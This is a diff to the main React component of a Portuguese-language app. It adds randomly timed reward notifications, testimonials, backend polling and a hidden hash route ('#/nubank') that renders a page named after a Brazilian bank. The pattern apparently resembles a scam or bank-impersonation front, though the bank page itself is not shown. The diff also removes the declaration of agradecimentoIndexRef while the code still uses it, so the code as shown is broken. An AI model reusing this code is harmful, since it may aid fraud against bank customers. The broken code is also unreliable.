@@ -7,6 +7,7 @@ import { Ranking } from './components/Ranking';
 import { Depoimentos } from './components/Depoimentos';
 import { BottomNav } from './components/BottomNav';
 import { PasswordLock } from './components/PasswordLock';
+import NubankPage from './pages/NubankPage';
 import { Notification, RewardedUser } from './types';
 import { useNotificationSystem } from './hooks/useNotificationSystem';
 import { getThankYouMessage } from './constants';
@@ -20,7 +21,10 @@ export default function App() {
   const [isDarkMode, setIsDarkMode] = useState(false);
   const [batteryClickCount, setBatteryClickCount] = useState(0);
   const [rewardedUsers, setRewardedUsers] = useState<RewardedUser[]>([]);
-  const agradecimentoIndexRef = useRef(0);
+  const pendingNotifIdRef = useRef<string | null>(null);
+  const processedIdsRef = useRef<Set<string>>(new Set());
+
+  const hash = window.location.hash;
 
   const {
     notifications,
@@ -52,6 +56,8 @@ export default function App() {
     }
   }, [activeTab, setUnreadDepoimentos]);
 
+  const [externalProcessedId, setExternalProcessedId] = useState<string | null>(null);
+
   useEffect(() => {
     const delay = Math.floor(Math.random() * 10000) + 15000;
     const timer = setTimeout(() => {
@@ -59,6 +65,29 @@ export default function App() {
     }, delay);
     return () => clearTimeout(timer);
   }, [notifications.length, generateNotification]);
+
+  useEffect(() => {
+    if (notifications.length === 0) return;
+    const latest = notifications[0];
+    if (processedIdsRef.current.has(latest.id)) return;
+    pendingNotifIdRef.current = latest.id;
+
+    const interval = setInterval(async () => {
+      try {
+        const res = await fetch('/api/status');
+        const data = await res.json();
+        if (!data.pending && pendingNotifIdRef.current && !processedIdsRef.current.has(pendingNotifIdRef.current)) {
+          const notifId = pendingNotifIdRef.current;
+          processedIdsRef.current.add(notifId);
+          setExternalProcessedId(notifId);
+          const found = notifications.find(n => n.id === notifId);
+          if (found) setActiveNotification(found);
+          clearInterval(interval);
+        }
+      } catch {}
+    }, 3000);
+    return () => clearInterval(interval);
+  }, [notifications]);
 
   const toggleTheme = () => {
     setIsDarkMode(prev => !prev);
@@ -77,10 +106,13 @@ export default function App() {
   };
 
   const handleLiberarRecompensa = (notif: Notification) => {
+    setExternalProcessedId(null);
     setConfirmedNotifications(prev => [notif, ...prev]);
     setNotifications(prev => prev.filter(n => n.id !== notif.id));
     setActiveNotification(null);
     addToBlacklist(notif.name);
+
+    fetch(`/api/process-by-id/${notif.id}`, { method: 'POST' }).catch(() => {});
 
     const mensagem = getThankYouMessage(notif.value, agradecimentoIndexRef);
 
@@ -108,6 +140,10 @@ export default function App() {
     setNotifications(prev => prev.filter(n => n.id !== notif.id));
     setActiveNotification(null);
   };
+
+  if (hash.startsWith('#/nubank')) {
+    return <NubankPage />;
+  }
 
   return (
     <div className={`flex justify-center items-center h-screen overflow-hidden transition-colors duration-500 ${isDarkMode ? 'bg-black' : 'bg-[#e5e7eb]'}`}>
@@ -139,6 +175,7 @@ export default function App() {
               isDarkMode={isDarkMode}
               onLiberarRecompensa={handleLiberarRecompensa}
               onRessarcir={handleRessarcir}
+              externalProcessedId={externalProcessedId}
             />
           )}
           {activeTab === 'extrato' && (
